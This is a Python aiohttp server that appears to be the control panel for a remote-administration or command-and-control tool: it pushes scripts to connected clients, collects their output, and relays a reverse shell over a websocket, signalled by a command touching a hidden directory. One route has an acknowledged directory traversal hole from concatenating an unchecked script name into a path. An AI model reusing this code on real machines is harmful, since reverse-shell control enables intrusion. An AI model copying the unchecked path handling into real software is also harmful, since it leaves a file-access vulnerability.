#!/usr/bin/env python3

import os
import asyncio
from aiohttp import web
import aiohttp_jinja2
import shared

routes = web.RouteTableDef()

routes.static("/node_modules", "./node_modules")

@routes.get("/")
async def index(request):
    async def x(client):
        return client, client.parse(await client.script("./scripts/status.sh"))
    tasks = [x(client) for client in shared.comm.clients.values()]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    status = {x[0]: x[1] for x in results if isinstance(x, tuple)}
    return aiohttp_jinja2.render_template("index.html", request, context={
        "status": status,
        "clients": [x for x in shared.comm.clients.values() if x in status],
        "scripts": os.listdir("./userscripts")
    })

@routes.get("/script/{script}")
async def script(request):
    async def x(addr):
        ip, port = addr.split(":")
        client = shared.comm.clients[ip, int(port)]
        return client, await client.script("./userscripts/" + request.match_info["script"]) # directory traversal exploit lol
    tasks = [x(addr) for addr in request.query.get("clients").split(",")]
    results = await asyncio.gather(*tasks)
    response = {"%s:%d" % k.host(): str(v, "utf8") for k, v in results}
    return web.json_response(response)

@routes.get("/rev/{ip}/{port}")
async def rev(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    ip = request.match_info["ip"]
    port = request.match_info["port"]
    token = str(await shared.comm.clients[(ip, int(port))].msg("touch /.__EL_SNEEDIO__/rev &"), "utf8")
    shared.ws_clients[token] = ws

    try:
        async for msg in ws:
            shared.rev.clients[token][1].write(bytes(msg.data, "utf8"))
            await shared.rev.clients[token][1].drain()
    finally:
        del shared.ws_clients[token]
        shared.rev.clients[token][1].close()
        return ws

@routes.get("/shell/{ip}/{port}")
async def shell(request):
    return aiohttp_jinja2.render_template("shell.html", request, context={
        "ip": request.match_info["ip"],
        "port": request.match_info["port"]
    })
